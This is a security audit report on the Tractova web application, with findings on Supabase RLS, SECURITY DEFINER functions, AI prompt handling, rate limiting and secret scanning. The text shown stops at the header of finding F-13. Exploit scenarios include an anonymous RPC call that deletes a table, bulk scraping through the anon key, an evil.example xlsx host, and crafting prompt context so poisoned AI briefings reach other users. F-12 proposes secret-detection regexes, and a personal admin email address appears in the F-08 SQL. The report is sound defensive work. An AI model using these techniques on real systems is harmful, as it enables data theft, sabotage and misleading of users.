# Tractova Security Audit — Findings Report

**Date:** 2026-06-10
**Scope:** Full-stack review of the Tractova production application — Vite + React SPA on Vercel (Hobby), Supabase (Postgres + Auth + Row-Level Security), Stripe billing, Resend email, and the Anthropic API for AI insights. The SPA talks to Supabase **directly** with the public anon key under RLS; twelve top-level `api/*.js` files are Vercel serverless functions.
**Method:** Multi-hunter pass with adversarial verification. Every Critical/High and Medium finding below was re-opened against the live source tree and the cited snippet confirmed verbatim before inclusion.

> **Acronyms, plain-English:** **RLS** = Row-Level Security (Postgres rules deciding which rows a logged-in user may read/write). **PostgREST** = the auto-generated REST API Supabase puts in front of the database. **SSRF** = Server-Side Request Forgery (tricking our server into fetching an attacker's URL). **JWT** = the signed login token the browser holds. **CSP** = Content-Security-Policy (a browser allow-list of what a page may load/run).

---

## 1 — Executive Summary

### Counts by severity

| Severity | Count | Notes |
|---|---:|---|
| **Critical** | 0 | None found. The privileged-column guard, webhook signature check, and SSRF guard all held. |
| **High** | 1 | F-01 — bulk exfiltration of the synthesized dataset (the product's IP). |
| **Medium** | 6 | F-02 … F-07 (one, F-07, is a documented-accepted xlsx item with a newly-found gap). |
| **Low** | 20 | F-08 … F-26 plus F-44 — hardening, hygiene, observability, supply-chain, and an export-sanitization gap. |
| **Total findings** | **27** | |
| Verified controls (prior fixes still intact) | 17 | F-27 … F-43, tabulated in Section 3. |
| Refuted during verification | 7 | Listed in the Appendix. |

There is **no actively-exploitable account-takeover, payment-bypass, or remote-code-execution** finding. The single High is a business-IP exposure, not a system compromise. The rest are defense-in-depth and operational-resilience gaps. The audit also **confirmed 17 prior fixes are still intact** — the security posture from the 2026-05-31 audit has not regressed (with one small exception, F-08).

### Top 5 most dangerous — in plain English

1. **Anyone on the internet can download your entire market dataset for free (F-01, High).** Every Tractova-synthesized table — revenue rates, the confidence tiers and percentile bands, all 3,222 county scores, 34,992 tract records, project pipelines — is marked "public read" in the database. Because the browser ships the anon key, a competitor with zero account can script the public API and page through every row and column in minutes. **Business impact:** the proprietary synthesis *is* the product; this lets a rival clone it wholesale.

2. **An anonymous visitor can wipe the Stripe anti-replay ledger (F-02, Medium).** A database function meant only for maintenance is callable by the public anon key. One call with `{"days":0}` deletes the entire table that stops Stripe webhook events from being replayed — re-opening the race where a replayed checkout could attach a paid tier to the wrong account. **Business impact:** billing-integrity sabotage and unauth destruction of a security-control table.

3. **A single Pro account can run up your Anthropic bill almost without limit (F-03 + F-05, Medium).** The AI handlers paste uncapped client arrays straight into the prompt (one request can be sized to ~$0.50–0.60), and the spend-limiter **fails open** — if Supabase has a read blip, all rate limiting silently switches off. **Business impact:** ~$30–36/hr of runaway AI spend per account, multiplied across accounts, with no daily ceiling and no alert.

4. **Poisoned AI briefings can be served to other paying users (F-04, Medium).** The verdict cache key leaves out the client-supplied context that actually shapes the prompt, so a Pro attacker can craft a misleading "this market is dead" brief and have it cached and served to every other Pro user who opens that county for 6 hours. **Business impact:** directly attacks the data-integrity tenet that is Tractova's whole thesis.

5. **If your admin dataset is tampered with, there is no record of who did it (F-06, Medium).** The `admin_audit_log` table and its writer function exist but are called by **zero** code — all admin curation happens client-side under an RLS gate with no audit trail. **Business impact:** a compromised admin JWT could silently flip scores, statuses, and policy dollar figures across states, and the tamper would be invisible after the fact.

---

## 2 — Findings (Critical → Low)

### Severity / status legend
- **Status** is one of: `open` (needs a fix), `📋 documented-accepted` (a prior risk decision — revisit, don't re-litigate), `regression` (a previously-removed pattern that crept back).
- **Effort:** S = a few hours · M = a day or two · L = multi-day.

---

## [F-01] Entire synthesized market dataset is bulk-exfiltratable by an unauthenticated visitor — High · open

- **OWASP / CWE:** A01 Broken Access Control / CWE-200 (Exposure of Sensitive Information)
- **Location:** [supabase/migrations/003_revenue_rates.sql:48-49](../supabase/migrations/003_revenue_rates.sql) (the pattern repeats on every synthesized table — see Exploit)

**Evidence** (re-read verbatim, lines 46-49):
```sql
alter table revenue_rates enable row level security;

create policy "public read revenue_rates"
  on revenue_rates for select using (true);
```

**Exploit scenario (Tractova-specific):** The SPA ships `VITE_SUPABASE_ANON_KEY` in the bundle ([src/lib/supabase.js:19-22](../src/lib/supabase.js)) and talks to Supabase directly. Every synthesized table carries a `SELECT … USING(true)` policy, so an attacker with no account scripts `supabase-js` (or raw `GET /rest/v1/revenue_rates?select=*`) and paginates with `.range()` to pull every row and every column. This exports the crown-jewel synthesis: `revenue_rates` (calibrated $/W + revenue rates), `solar_cost_index` (`confidence_tier` + p10–p90 percentiles), `county_geospatial_data` scores (3,222 rows), `nmtc_lic_tracts` (34,992 rows), `ix_queue_data`, `cs_projects` (~4,280), `comparable_deals`, `hosting_capacity_data`, plus `state_programs` / `county_intelligence` / `revenue_stacks`. A competitor reconstructs the entire product in minutes. The `X-Robots-Tag: noindex` on `/api/*` gives zero protection — reads go to the separate `*.supabase.co` origin. PostgREST's max-rows is a per-request cap, not a total cap; range pagination walks the whole table.

**Proposed fix:** Stop exposing synthesized columns to the `anon`/`authenticated` PostgREST roles. (1) For each synthesized table create a `*_public` VIEW exposing only low-value/preview columns (and a coarsened teaser sample), point the SPA at the view, `REVOKE SELECT` on the base table from anon/authenticated, `GRANT SELECT` on the view only. (2) Gate the full synthesized columns behind an RLS predicate checking Pro tier — `using ((select subscription_tier from profiles where id = auth.uid()) = 'pro')` — instead of `using(true)`. (3) Lower the project's PostgREST `db-max-rows` and route bulk/aggregate reads through a server function that enforces a per-IP/per-user row budget. The honest minimum: drop `confidence_tier`, the `p*` percentile columns, and the calibrated-rate/score columns from any anon-readable surface.

- **Effort:** L
- **Verification:** STANDS — line 46 enables RLS, 48-49 grant the anon role unrestricted SELECT; the anon key is attacker-reachable from the bundle with zero account, and a multiline grep confirmed the same `for select using (true)` on every cited crown-jewel table.

---

## [F-02] Anon-callable SECURITY DEFINER prune function can wipe the Stripe webhook idempotency ledger — Medium · open

- **OWASP / CWE:** A01 Broken Access Control / CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **Location:** [supabase/migrations/060_webhook_events_processed.sql:52-69](../supabase/migrations/060_webhook_events_processed.sql)

**Evidence** (re-read verbatim, lines 52-66):
```sql
create or replace function public.prune_webhook_events_older_than_days(days int default 90)
returns int
language plpgsql
security definer
set search_path = public
as $$
declare
  cutoff timestamptz := now() - (days || ' days')::interval;
  deleted int;
begin
  delete from webhook_events_processed where created_at < cutoff;
  get diagnostics deleted = row_count;
  return deleted;
end;
$$;
```

**Exploit scenario (Tractova-specific):** This `SECURITY DEFINER` function deletes from `webhook_events_processed` — the RLS-locked table (lines 40-47 deny all) whose entire purpose is closing the Stripe `checkout.session.completed` / `customer.subscription.updated` replay races. No `REVOKE EXECUTE` appears anywhere in the migration set, and Postgres/Supabase grant `EXECUTE` on new public-schema functions to `anon` + `authenticated` by default, exposing it at `POST /rest/v1/rpc/prune_webhook_events_older_than_days`. An unauthenticated attacker calls it with `{"days":0}` (cutoff = `now()`, so `created_at < now()` matches every row) or a negative value, using only the public anon key, and deletes the entire idempotency ledger. A subsequent replayed `checkout.session.completed` can then link `session.customer`/Pro tier to the wrong profile, and replayed `subscription.updated` events can flap a victim's tier. It is also a direct unauth data-destruction primitive on a security-control table.

**Proposed fix:** Add a migration that revokes execute and locks the function to the maintenance path only:
```sql
revoke all on function public.prune_webhook_events_older_than_days(int)
  from public, anon, authenticated;
```
Pruning is only ever invoked by service-role/admin maintenance (which bypasses RLS and is unaffected by the revoke), so no caller breaks. Optionally confirm via `pg_proc.proacl` that anon/authenticated no longer appear.

- **Effort:** S
- **Verification:** STANDS — declared `SECURITY DEFINER` with no REVOKE (grep across all migrations confirms zero `REVOKE EXECUTE`); `SECURITY DEFINER` runs as owner and bypasses the table's deny-all RLS, so `{"days":0}` (or negative) wipes the whole ledger as an unauth data-destruction primitive.

---

## [F-03] Lens AI handlers build Anthropic prompts from uncapped client arrays/objects — Medium · open

- **OWASP / CWE:** A04 Insecure Design / CWE-770 (Allocation of Resources Without Limits or Throttling)
- **Location:** [api/handlers/_lens-portfolio.js:8-20](../api/handlers/_lens-portfolio.js) (same shape in `_lens-compare.js` and [api/handlers/_lens-sensitivity.js:18](../api/handlers/_lens-sensitivity.js))

**Evidence** (re-read verbatim, lines 9-16):
```js
const { projects } = body
if (!projects?.length) return res.status(400).json({ error: 'No projects provided' })

const lines = [`PORTFOLIO: ${projects.length} projects\n`]
projects.forEach((p, i) => {
  lines.push(`${i + 1}. ${p.name || 'Unnamed'} — ${p.mw || '?'}MW ${p.technology || 'Solar'} in ${p.state || '?'}, ${p.county || '?'} County`)
  lines.push(`   Stage: ${p.stage || 'Unknown'} | Score: ${p.score ?? '?'}/100 | IX: ${p.ixDifficulty || '?'} | CS Status: ${p.csStatus || '?'}`)
})
```

**Exploit scenario (Tractova-specific):** Any Pro subscriber (or a leaked/shared Pro JWT) POSTs to `/api/lens-insight` with action `portfolio` or `compare` and a `projects` array packed up to Vercel's ~4.5 MB body limit, plus unbounded `name`/`county`/`stage` strings per element. Each element is concatenated verbatim into the Sonnet prompt with **no length cap** — contrast `_lens-news-summary.js:17`, which does `items.slice(0, 12)` and per-line trims. A body sized just under Sonnet's 200K-token context (~600–800 KB) is billed at full input-token cost (~$0.50–0.60 each); the per-user limiter allows 60/hr, so one account can drive ~$30–36/hr of uncapped Anthropic input spend, repeatable across accounts. `_lens-sensitivity.js:18` shares the shape (`Object.entries(override).forEach(...)` plus an uncapped `scenario` string). This is the "a sibling copy has the cap, this copy lost it" AI-codegen pattern.

**Proposed fix:** Add explicit caps at the top of each handler, mirroring news-summary. In `_lens-portfolio.js` / `_lens-compare.js`: `const list = Array.isArray(projects) ? projects.slice(0, 25) : []` and truncate each string field (`String(p.name || '').slice(0, 120)`). In `_lens-sensitivity.js`: cap `Object.entries(override).slice(0, 30)`, truncate each value with `String(v).slice(0, 200)`, clamp `scenario` to `String(scenario).slice(0, 500)`. Reject with 400 when `projects.length` exceeds the cap rather than silently truncating, so callers get a clear error.

- **Effort:** S
- **Verification:** Verified in code — `_lens-portfolio.js:8-20` iterates the entire client `projects` array with `forEach` (no `.slice()`) and concatenates fields verbatim with no per-field cap, while the sibling `_lens-news-summary.js:17` caps; the Pro gate and 10/min+60/hr limiter run before dispatch but do not bound per-call token size.

---

## [F-04] Cross-user AI verdict cache poisoning: cache key omits the client context that drives the prompt — Medium · open

- **OWASP / CWE:** A04 Insecure Design / CWE-345 (Insufficient Verification of Data Authenticity)
- **Location:** [api/lens-insight.js:476-497](../api/lens-insight.js)

**Evidence** (re-read verbatim, lines 476-487 + 497):
```js
const verdictKey = buildCacheKey('verdict', {
  state:               body.state,
  county:              body.county,
  mw:                  Math.round((parseFloat(body.mw) || 0) * 10) / 10,
  stage:               body.stage,
  technology:          body.technology,
  dataVersion:         dataVersionFor(body.stateProgram, policyEvents),
  buildContextVersion: 6,
})
const cachedVerdict = await cacheGet(verdictKey)
if (cachedVerdict) {
  return res.status(200).json({ insight: cachedVerdict, cached: true })
}
// …later the PROMPT is built from MORE client fields:
const contextText = buildContext({ ...body, policyEvents })
```

**Exploit scenario (Tractova-specific):** The Sonnet prompt (`buildContext`, line 497) is built from client-supplied `body.countyData`, `body.ixQueue`, `body.revenueStack`, `body.runway`, and all `body.stateProgram` fields — none validated against the DB. But the cache key (line 476) includes only state/county/mw/stage/technology plus `dataVersionFor` (which reads only `stateProgram.lastUpdated`, itself client-supplied). A paying Pro attacker sends `action=verdict` for a popular combo (e.g. NY / a real county / 5 MW / Development / Community Solar) with a **crafted** `countyData`/`ixQueue` payload and a `lastUpdated` copied from the public `revenue_rates` row so the key matches. The attacker-shaped insight is cached for 6h under that key. Every other Pro user opening the Lens for the same county within 6h gets a cache **HIT** and is served the poisoned brief — misleading "withdraw, this market is dead" guidance or injected text — undermining the data-integrity tenet that *is* the product. `deal-memo` / `utility-outreach` share the same `ai_response_cache` and warrant the same review.

**Proposed fix:** Make the cache key cover every input that influences the prompt: replace the hand-picked field list with a SHA-256 of the full canonicalized `buildContext` input (or of `contextText` itself) folded into `buildCacheKey`. Better still, stop trusting client context: fetch `stateProgram`/`countyData`/`ixQueue`/`revenueStack` server-side from the DB inside the handler, then build prompt + key. At minimum, user-scope the verdict cache key whenever any context field is client-provided so a poisoned entry cannot be served to a different user.

- **Effort:** M
- **Verification:** Verified directly — the key includes only state/county/mw/stage/technology/dataVersion/buildContextVersion while the prompt is built via `buildContext({ ...body, policyEvents })`, which spreads raw client body overriding only `policyEvents`; `dataVersionFor` derives its version from client-supplied `stateProgram.lastUpdated`, enabling a deliberate key collision.

---

## [F-05] Spend-bearing rate limiters fail OPEN on infra error; no per-day/global AI cap — Medium · open

- **OWASP / CWE:** A04 Insecure Design / CWE-770 (Allocation of Resources Without Limits or Throttling)
- **Location:** [api/lens-insight.js:363-387](../api/lens-insight.js) and [api/_rate-limit.js:44-67](../api/_rate-limit.js)

**Evidence** (re-read verbatim, lines 363-387):
```js
    if (!rlErr && recentCalls) {
      if (recentCalls.length >= RL_SUSTAINED_PER_HOUR) {
        return res.status(429).json({ error: 'Rate limit exceeded', reason: 'sustained_per_hour', ... })
      }
      // …burst check…
    }
  } catch (_err) {
    // Rate-limit infrastructure failure must never block legitimate use.
    // Log and continue.
    console.warn('[lens-insight:ratelimit] check failed:', _err.message)
  }
```
*(`_rate-limit.js:44-47` and `:64-67` likewise `return { ok: true }` on any error.)*

**Exploit scenario (Tractova-specific):** Both the inline lens-insight limiter (the `catch` proceeds, and the non-throwing path only enforces `if (!rlErr && recentCalls)`, so an `rlErr` also falls through) and the shared `checkRateLimit` helper fail open. All three limiters read the same `api_call_log` store, so a Supabase read outage — or a deliberately induced error — **disables all rate limiting at once**: uncapped Anthropic spend on every lens-insight action, plus the 5/hr caps on `create-checkout-session` and `alert-test` evaporate. Even healthy, there is no per-day or global cap: a single Pro account can sustain 60 calls/hour ≈ 1,440 Sonnet calls/day, and by varying county/mw to bust the shared verdict cache those are all uncached billed calls. The same fail-open lets a Pro user run `tract-resolve` up to 60/hr, draining the Census geocoder's shared quota for everyone.

**Proposed fix:** On the spend-bearing path, **fail closed** (or degrade to a conservative per-instance in-memory token bucket) instead of returning `ok:true` when the `api_call_log` query errors — a metering outage must throttle, not unleash, paid calls. Add an absolute per-user daily cap (e.g. 200 lens calls/day) and a global daily ceiling checked before `client.messages.create`. Keep `tract-resolve` on its own small sub-cap (e.g. 30/day/user) so one user can't exhaust the shared Census limit.

- **Effort:** M
- **Verification:** Confirmed in code — `lens-insight.js:383-387` catches any rate-limit error and continues; `_rate-limit.js:44-47` and `:64-67` both `return {ok:true}` on error; all three limiters read the same `api_call_log` store, so one Supabase read outage disables them simultaneously, and no per-day/global cap or budget breaker exists on the AI path.

---

## [F-06] Admin data-curation writes leave no audit trail — `admin_audit_log` and `logAdminAction()` are dead code — Medium · open

- **OWASP / CWE:** A09 Security Logging & Monitoring Failures / CWE-778 (Insufficient Logging)
- **Location:** [api/_admin-auth.js:74-87](../api/_admin-auth.js)

**Evidence** (re-read verbatim, lines 74-87):
```js
export async function logAdminAction(supabaseAdmin, actor, { action, targetTable, targetId, details }) {
  try {
    await supabaseAdmin.from('admin_audit_log').insert({
      actor_id: actor?.id || null,
      actor_email: actor?.email || null,
      action,
      target_table: targetTable,
      target_id: targetId == null ? null : String(targetId),
      details: details || null,
    })
  } catch (e) {
    console.warn('[admin-audit] insert failed:', e?.message)
  }
}
```

**Exploit scenario (Tractova-specific):** Migration 057 created `admin_audit_log` specifically to track admin writes, and `logAdminAction()` exists to write it — but a repo-wide grep shows it is imported/called by **zero** files. All admin curation (`state_programs`, `county_intelligence`, `revenue_rates`, `news_feed`, `puc_dockets`, `policy_impact_events`) runs client-side via the anon-key Supabase client gated only by the `is_admin()` RLS policy ([src/lib/programData.js:1677-1856](../src/lib/programData.js)) — no server endpoint sits in the path to call the audit writer. If the single admin account (or its JWT) is compromised, an attacker who flips `cs_status`, `capacity_mw`, `lmi_percent`, or policy dollar provisions across states leaves **no who/when/what record** anywhere queryable. The product's whole thesis is data legitimacy; a silent tamper of the proprietary dataset is invisible after the fact. Only `state_programs` edits routed through the data-health staging-promote path write to `data_updates` (a separate, partial trail).

**Proposed fix:** Add a Postgres `AFTER INSERT/UPDATE/DELETE` trigger on the admin-write tables that inserts into `admin_audit_log` capturing `auth.uid()`, `auth.jwt()->>'email'`, `TG_OP`, `TG_TABLE_NAME`, the row PK, and a `to_jsonb(NEW)`/`to_jsonb(OLD)` diff. A DB trigger is the correct layer because writes are client-direct (no server hook exists to call `logAdminAction`) and it is tamper-proof against future client refactors. Either way, delete `logAdminAction` if it stays unused so it isn't mistaken for live coverage.

- **Effort:** M
- **Verification:** Re-read `_admin-auth.js:74-87` and grepped the whole repo — zero importers/call-sites for `logAdminAction` (only the definition and a docs/archive mention); `isAdminFromBearer` from the same module is used by 7 handlers, so the module is live but the audit writer is dead, and the only DB triggers across all migrations are `updated_at` touchers plus the 071 profiles guard — no audit trigger exists.

---

## [F-07] xlsx allowlist rationale understates the parse-path trust root; MD scraper follows a runtime-discovered absolute URL into `XLSX.read` — Medium · 📋 documented-accepted (with a new gap)

- **OWASP / CWE:** A06 Vulnerable & Outdated Components / CWE-1357 (Reliance on Insufficiently Trustworthy Component)
- **Location:** [api/scrapers/_refresh-md-dg.js:41-53](../api/scrapers/_refresh-md-dg.js)

**Evidence** (re-read verbatim, lines 47-52):
```js
  const html = await res.text()
  // The community-solar list lives under /SiteAssets/Pages/MarylandCommunitySolar/.
  const m = html.match(/href="([^"]*MarylandCommunitySolar\/[^"]*\.xlsx[^"]*)"/i)
  if (!m) throw new Error('MEA: community-solar .xlsx link not found on page')
  const href = m[1].replace(/&amp;/g, '&')
  return href.startsWith('http') ? href : ORIGIN + href
```

**Exploit scenario (Tractova-specific):** The allowlist (`scripts/audit-allowlist.json:19,28`) accepts the two high xlsx advisories (GHSA-4r6h-8v6p-xvw6 prototype pollution, GHSA-5pgg-2g8v-p4x9 ReDoS) on the basis that `XLSX.read` only runs against "fixed, pinned state-agency HTTPS URLs." Verified: the 4 named scrapers are the only `api/` read paths and the client path (`src/pages/Library.jsx:120-159`) is write-only. But the trust root is broader than documented — CA = pge.com, VA = Dominion via `cdn-dominionenergy-prd-001.azureedge.net`, NJ = firstenergycorp.com / pseg.com / azureedge CDNs (utility-corporate CDNs, not state agencies) — and **MD is not pinned at all**: the xlsx URL is regex-scraped from the MEA page HTML, so an absolute `href` like `https://evil.example/MarylandCommunitySolar/x.xlsx` passes the match and is fetched and parsed. An attacker who can inject a link into the `energy.maryland.gov` page (stored-content injection — a weaker precondition than compromising the workbook host) gets attacker-controlled bytes into the vulnerable `XLSX.read` inside the cron function.

**Acceptance rationale & status:** The two xlsx advisories are documented-accepted in `scripts/audit-allowlist.json` (`review_due` 2026-08-06), with the exceljs migration tracked for **Q3 2026**. The acceptance remains reasonable — but the rationale text is inaccurate and the MD off-origin gap is *new*, so this needs the small hardening below, not a re-litigation of the acceptance.

**Proposed fix:** In `findXlsxUrl`, reject off-origin absolute hrefs before returning: `if (href.startsWith('http') && !href.startsWith(ORIGIN + '/')) throw new Error('MEA xlsx link off-origin: ' + href)`. Then correct both xlsx allowlist `reason` fields: replace "fixed, pinned state-agency HTTPS URLs" with the real host list (PG&E, Dominion/azureedge, FirstEnergy/PSEG/azureedge, MEA page-discovered link constrained to `energy.maryland.gov`) and note the `scripts/*.mjs` local-only read paths.

- **Effort:** S
- **Revisit:** 2026-08-06 (with the existing xlsx allowlist review) / exceljs migration Q3 2026.

---

## [F-08] `nmtc_lic_tracts` write RLS reintroduces hardcoded admin-email policies dropped by migration 059 — Low · regression

- **OWASP / CWE:** A01 Broken Access Control / CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Location:** [supabase/migrations/080_nmtc_lic_tracts.sql:38-47](../supabase/migrations/080_nmtc_lic_tracts.sql)

**Evidence** (re-read verbatim, lines 38-47):
```sql
drop policy if exists "nmtc_lic_tracts admin insert" on nmtc_lic_tracts;
create policy "nmtc_lic_tracts admin insert"
  on nmtc_lic_tracts for insert
  with check (auth.jwt() ->> 'email' = 'aden.walker67@gmail.com');

drop policy if exists "nmtc_lic_tracts admin update" on nmtc_lic_tracts;
create policy "nmtc_lic_tracts admin update"
  on nmtc_lic_tracts for update
  using       (auth.jwt() ->> 'email' = 'aden.walker67@gmail.com')
  with check  (auth.jwt() ->> 'email' = 'aden.walker67@gmail.com');
```

**Exploit scenario (Tractova-specific):** Migration 059 (`drop_legacy_email_rls`) deliberately swept every email-literal RLS policy and 058 standardized admin writes on `public.is_admin()`; migration 080 (written later) re-adds two email-literal write policies on `nmtc_lic_tracts`. Not directly exploitable today — only the verified admin email matches, so no non-admin gains write — but it regresses the "zero email-literal policies" invariant the 059 verification query asserts. The trust anchor is now the raw email string in two more places: if the admin email is ever changed/rotated (role flips are the supported mechanism per migration 057), the tract write path silently dies while the role-based path keeps working, and the literal is a maintenance footgun diverging from every other admin-write table.

**Proposed fix:** Re-create both policies with the canonical helper, matching every other admin-write table (058): replace the two `auth.jwt() ->> 'email' = '…'` predicates with `public.is_admin()` in a new idempotent migration (`drop policy if exists` + `create policy … using/with check (public.is_admin())`).

- **Effort:** S
- **Verification:** Re-read 080:38-47 (verbatim), 058:50-67, 059:38-70 — the regression stands as the sole post-059 reintroduction; the seed writes via the service-role key (RLS-bypassing) and the handler only reads, so no JWT-authed write path exists, capping it at Low.

---

## [F-09] Account enumeration via distinct "email not confirmed" sign-in error — Low · open

- **OWASP / CWE:** A07 Identification & Authentication Failures / CWE-204 (Observable Response Discrepancy)
- **Location:** [src/pages/SignIn.jsx:254-260](../src/pages/SignIn.jsx)

**Evidence** (re-read verbatim, lines 254-260):
```js
function humanizeError(msg) {
  if (!msg) return 'Something went wrong. Try again.'
  if (msg.toLowerCase().includes('captcha')) return 'Please complete the captcha and try again.'
  if (msg.toLowerCase().includes('invalid login')) return 'Invalid email or password.'
  if (msg.toLowerCase().includes('email not confirmed')) return 'Please confirm your email before signing in.'
  return msg
}
```

**Exploit scenario (Tractova-specific):** `SignUp.jsx:344` already collapses the "already registered" signal to a generic message (the A2 fix), but SignIn still maps Supabase's "Email not confirmed" error to a distinct string. An attacker scripting sign-in attempts against a candidate list gets three distinguishable outcomes: "Invalid email or password" (no account *or* wrong password), "Please confirm your email…" (account **exists** but unconfirmed), and success. The unconfirmed branch confirms an address is registered, defeating the anti-enumeration intent the rest of the auth surface upholds, and lets an attacker build a list of valid Tractova customer emails for targeted phishing. (Confidence medium: whether Supabase returns the "Email not confirmed" string at all depends on the live "Confirm email" obfuscation toggle.)

**Proposed fix:** Collapse the unconfirmed-email branch into the generic credential error — drop the `email not confirmed` case and return `'Invalid email or password.'` for everything except the captcha case. If unconfirmed users need a nudge, do it post-authentication on a confirmed session, not on the pre-auth error path.

- **Effort:** S
- **Verification:** Re-read SignIn.jsx — `humanizeError` returns a distinct string for "email not confirmed" vs "invalid login," so the oracle exists; mitigated (not neutralized) by server-side hCaptcha per attempt and by the oracle only distinguishing *unconfirmed* accounts.

---

## [F-10] Supabase session tokens persisted in localStorage (XSS yields full session theft) — Low · open

- **OWASP / CWE:** A07 Identification & Authentication Failures / CWE-522 (Insufficiently Protected Credentials)
- **Location:** [src/lib/supabase.js:19-22](../src/lib/supabase.js)

**Evidence** (re-read verbatim, lines 19-22):
```js
export const supabase = createClient(
  supabaseUrl     ?? 'https://placeholder.supabase.co',
  supabaseAnonKey ?? 'placeholder'
)
```

**Exploit scenario (Tractova-specific):** `createClient` is called with no options object, so supabase-js v2 defaults apply: the access + refresh tokens land in localStorage under `sb-<ref>-auth-token`, readable by any JavaScript in the origin. Any successful XSS anywhere in the SPA (or a malicious/compromised npm dependency running at runtime) can exfiltrate the refresh token and impersonate the user indefinitely — it survives the tab closing and auto-mints new access tokens. For a Pro user, the attacker inherits paid Lens access and the entire saved portfolio. Currently bounded by the strict CSP (`script-src 'self' 'wasm-unsafe-eval'` + hCaptcha, no `unsafe-inline`), so this is a defense-in-depth gap, not a live exploit.

**Proposed fix:** Document the storage decision in code (the CSP is the compensating control) and keep `script-src` free of `unsafe-inline`/`unsafe-eval` and attacker-registerable hosts. The durable fix is a thin server-side auth proxy that puts the refresh token in an `httpOnly + Secure + SameSite` cookie and exchanges it for short-lived access tokens, keeping the refresh token out of JS reach. At minimum, pass an explicit `auth: { storage, storageKey }` block so the choice is intentional and reviewable.

- **Effort:** M
- **Verification:** Re-read supabase.js in full (24 lines) — `createClient(url, anonKey)` with no third options argument, and a grep confirms it is the only `createClient` with no storage override anywhere, so v2 defaults put both tokens in localStorage; the CSP raises the XSS bar but does not neutralize the supply-chain vector.

---

## [F-11] Env-var inventory drift: real secrets (`HEALTH_CHECK_TOKEN`, `AXIOM_TOKEN`) and 8+ in-use vars missing from the manifest + CLAUDE.md §7 — Low · open

- **OWASP / CWE:** A05 Security Misconfiguration / CWE-1059 (Insufficient Technical Documentation)
- **Location:** [docs/secrets-manifest.md:34-47](../docs/secrets-manifest.md)

**Evidence** (manifest inventory table, lines 34-47):
```md
| `CRON_SECRET` | Bearer token gate on `api/refresh-data.js` | No | Semi-annually |
| `VITE_HCAPTCHA_SITEKEY` | hCaptcha widget on auth forms (public sitekey) | Yes (public) | n/a … |
```

**Exploit scenario (Tractova-specific):** The manifest drives the rotation calendar and the Vercel-env pre-deploy check. In-use vars absent from it: `HEALTH_CHECK_TOKEN` (a live bearer secret gating `api/data-health.js`, present in `.env.local`), `AXIOM_TOKEN`/`AXIOM_DATASET`, `EIA_API_KEY`, `NREL_API_KEY`, `CENSUS_API_KEY`, `STRIPE_PRICE_ID` + `VITE_STRIPE_PRICE_ID`, `VITE_LIC_TRACT_LOOKUP`, `LBNL_TTS_CSV_URL`, `TEST_USER_EMAIL`/`TEST_USER_PASSWORD`, `RESTORE_ALLOW_PROD`. A leaked `HEALTH_CHECK_TOKEN` would never be rotated because no cadence/owner exists for it; the CLAUDE.md §7 house rule ("New var → update this list") has not been followed since the 2026-05-06 review. `VITE_STRIPE_PRICE_ID` and `VITE_LIC_TRACT_LOOKUP` also exceed the sanctioned-5 browser-exposed list, though both are public-by-design (server re-validates the price id).

**Proposed fix:** Add manifest rows for each missing var with rotation cadence/owner: `HEALTH_CHECK_TOKEN` (No, semi-annual, gates `api/data-health.js`), `AXIOM_TOKEN` (No, annual), `AXIOM_DATASET` (No, n/a), `EIA_API_KEY`/`NREL_API_KEY`/`CENSUS_API_KEY` (No, annual, free-tier gov keys), `STRIPE_PRICE_ID`/`VITE_STRIPE_PRICE_ID` (Yes-public, server-validated), `VITE_LIC_TRACT_LOOKUP` (Yes-public build flag), `LBNL_TTS_CSV_URL` (No), `TEST_USER_EMAIL`/`TEST_USER_PASSWORD` (No, on test-account reset), `RESTORE_ALLOW_PROD` (No). Mirror the secret ones into CLAUDE.md §7 and bump "Last reviewed."

- **Effort:** S
- **Verification:** Re-read `secrets-manifest.md:34-47`, the rotation log, and `api/data-health.js:40-65` — `HEALTH_CHECK_TOKEN` is a live bearer secret absent from both the manifest and the rotation tracker, so no cadence/owner exists; severity capped at Low because `AXIOM_TOKEN` is rotation-tracked and the others are non-critical/gov keys.

---

## [F-12] `lint-secrets.mjs` skips `public/` (deployed verbatim to prod) and lacks patterns for several in-use secret formats — Low · open

- **OWASP / CWE:** A05 Security Misconfiguration / CWE-1295 (Debug Messages Revealing Unnecessary Information — applied to detection coverage gap)
- **Location:** [scripts/lint-secrets.mjs:56-66](../scripts/lint-secrets.mjs)

**Evidence** (snippet, lines 56-64):
```js
const SKIP_EXT = /\.(lock|log|snap|png|jpg|jpeg|gif|pdf|csv|xlsx|zip|woff2?|ttf|otf|ico)$/i
…
  if (p.startsWith('dist/')) return true
  if (p.startsWith('backups/')) return true
  if (p.startsWith('public/')) return true   // upstream data files
```

**Exploit scenario (Tractova-specific):** `public/` is tracked in git and ships byte-for-byte to `https://tractova.com/<path>` on every deploy, yet `shouldSkipPath` excludes the entire directory from both the pre-commit staged scan and the CI tracked-tree scan. A debug dump, `.env` copy, or config file accidentally saved under `public/` would be committed, deployed world-readable, and invisible to both detection layers. Secondary gaps: the pattern list has no rule for the project's own `AXIOM_TOKEN` (`xaat-` prefix), nor env-assignment rules for `HEALTH_CHECK_TOKEN=`/`AXIOM_TOKEN=`/`TEST_USER_PASSWORD=`/`EIA_API_KEY=`/`NREL_API_KEY=`/`CENSUS_API_KEY=` (the env-assignment class covers only 5 vars), no GitHub PAT (`ghp_`/`github_pat_`) or Slack webhook URL shapes (a real `profiles.slack_webhook_url` flow exists), and files > 2 MB are silently skipped.

**Proposed fix:** In `shouldSkipPath`, delete the `p.startsWith('public/')` line — `SKIP_EXT` already excludes the binary/data formats that caused false positives, so text files under `public/` get scanned. Add patterns: `['axiom', /\bxaat-[A-Za-z0-9-]{20,}/]`, `['github-pat', /\b(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{50,})/]`, `['slack-webhook', /hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/]`, plus env-assignment rules for the six vars above. Optionally warn (not skip silently) on > 2 MB tracked text files.

- **Effort:** S
- **Verification:** Read `lint-secrets.mjs` in full — line 64 skips `public/` and `shouldSkipPath` gates both the `--staged` and CI tracked-tree scans (`verify.yml:37-38` confirms `lint:secrets` is the only secret-scan layer); the "upstream data files" rationale is hollow since those files are also covered by `SKIP_EXT`.

---

## [F-13] `probe-axiom.mjs` prints the `AXIOM_TOKEN` prefix+suffix, violating the presence+length-only logging rule — Low · open

- **OWASP / CWE:** A09 Security Logging & Monitoring Failures / CWE-532 (Insertion of Sensitive Information into Log)
